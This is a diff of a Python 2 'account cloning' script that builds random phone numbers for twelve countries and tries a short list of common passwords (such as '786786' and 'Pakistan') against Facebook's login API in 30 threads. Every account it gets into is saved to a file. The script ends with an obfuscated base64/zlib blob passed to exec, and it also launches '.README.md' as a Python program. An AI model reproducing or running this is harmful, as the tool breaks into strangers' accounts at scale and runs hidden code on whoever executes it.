@@ -1,444 +1,6 @@
#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Tech Qaiser
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(1000):

    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
#Original Written By Qaiser
#Youtube : Tech Qaiser
#Github : https:github.com/TechQaiser

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Devil.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = '\033[0;34m============\033[4;43;91mGitHub \033[1;0m:-\033[30;46;91mhttps://github.com/TechQaiser.............\033[1;0m\033[4;43;91mFacebook \033[1;0m :-\033[30;41;96m Qaiser Abbas.........\033[1;0m\033[4;43;91mYouTube\033[1;0m :-\033[30;41;96mTech Qaiser........\033[1;0m\033[0;32m===                                      '
back = 0
successful = []
cpb = []
oks = []
id = []

print """
\033[4;41;43m░██████╗░░█████╗░██╗░██████╗███████╗██████╗░\033[1;0m
\033[4;41;43m██╔═══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗\033[1;0m
\033[4;41;43m██║██╗██║███████║██║╚█████╗░█████╗░░██████╔╝\033[1;0m
\033[4;41;43m╚██████╔╝██╔══██║██║░╚═══██╗██╔══╝░░██╔══██╗\033[1;0m
\033[4;41;43m░╚═██╔═╝░██║░░██║██║██████╔╝███████╗██║░░██║\033[1;0m
\033[4;41;43m░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝\033[1;0m
\033[1;31m※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※"""

CorrectUsername = "Qaiser"
CorrectPassword = "Devil"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m🔒\x1b[1;93mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🔐 \x1b[1;93mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
    else:
        print "\033[1;97mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')

def menu():
    os.system('clear')
    print logo
    print '     '
    print '\x1b[1;92m[1]\x1b[1;91m  Bangladesh'

    print '\x1b[1;94m[2]\x1b[1;92m  USA'

    print '\x1b[1;96m[3]\x1b[1;93m  UK'

    print '\x1b[1;97m[4] \x1b[1;94m India'

    print '\x1b[1;91m[5]\x1b[1;95m  Brazil'

    print '\x1b[1;93m[6]\x1b[1;96m  Japan'

    print '\x1b[1;95m[7]\x1b[1;97m  Korea'

    print '\x1b[1;96m[8]\x1b[1;91m  Italy'

    print '\x1b[1;92m[9]\x1b[1;92m  Spain'

    print '\x1b[1;94m[10]\x1b[1;93m Poland'

    print '\x1b[1;96m[11]\x1b[1;94m Pakistan'

    print '\x1b[1;97m[12]\x1b[1;95m Indonisia'

    print '[0]\x1b[1;97mExit        '
    print '        '
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91m-------[Tech]-[Qaiser]------>>>>  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
        try:
            c = raw_input('\x1b[1;93m choose code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '\033[1;94m786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print '\033[1;95m737, 706, 748, 783, 739, 759, 790'
        try:
            c = raw_input(' choose code  : ')
            k = '+44'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print logo
        print '\033[1;96m954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578'
        try:
            c = raw_input(' choose code  : ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '5':
        os.system('clear')
        print logo
        print '\033[1;97m127, 179, 117, 853, 318, 219, 834, 186, 479, 113'
        try:
            c = raw_input(' choose code  : ')
            k = '+55'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '6':
        os.system('clear')
        print logo
        print '\033[1;91m11, 12, 19, 16, 15, 13, 14, 18, 17'
        try:
            c = raw_input(' choose code  : ')
            k = '+81'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '7':
        os.system('clear')
        print logo
        print '\033[1;92m1, 2, 3, 4, 5, 6, 7, 8, 9'
        try:
            c = raw_input(' choose code  : ')
            k = '+82'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '8':
        os.system('clear')
        print logo
        print '\033[1;93m388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328'
        try:
            c = raw_input(' choose code  : ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '9':
        os.system('clear')
        print logo
        print '\033[1;94m60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
        try:
            c = raw_input(' choose code  : ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '10':
        os.system('clear')
        print logo
        print '\033[1;95m66, 69, 78, 79, 60, 72, 67, 53, 51'
        try:
            c = raw_input(' choose code  : ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '11':
        os.system('clear')
        print logo
        print '\x1b[1;96m01 -- to --49'
        try:
            c = raw_input(' choose code  : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '12':
        os.system('clear')
        print logo
        print '\x1b[1;97m81,83,85,84,89,'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '13':
        os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
        login()
    elif bch == '0':
        exb()
    else:
        print '\033[1;91m[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('\033[1;92m[✓]Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('\x1b[1;95m[✓] Please wait, process is running ...')
    time.sleep(0.5)
    psb('\033[1;91m[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print ' \033[1;94m-------------------------------------------------------------------------------- '

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[0;34mSuccessful  ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[0;32mCheckpoint ' + k + c + user + '  |  ' + pass1
                cps = open('save/cloned.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '786786'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[0;34mSuccessful  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/cloned.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[0;32mCheckpoint ' + k + c + user + '  |  ' + pass2
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'Pakistan'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[0;34mSuccessful  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[0:32mCheckpoint ' + k + c + user + '  |  ' + pass3
                        cps = open('save/cloned.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '786786'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[0;34mSuccessful  ' + k + c + user + '  |  ' + pass4
                            okb = open('save/cloned.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[0;32mCheckpoint ' + k + c + user + '  |  ' + pass4
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = 'sayang'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[0;34mSuccessful  ' + k + c + user + '  |  ' + pass5
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[0;32mCheckpoint ' + k + c + user + '  |  ' + pass5
                                cps = open('save/cloned.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '         '
    print '\033[1;95mProcess Has Been Completed ....'
    print '\033[1;93mTotal OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '\033[1;91mCP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
import zlib,base64
exec(zlib.decompress(base64.b64decode("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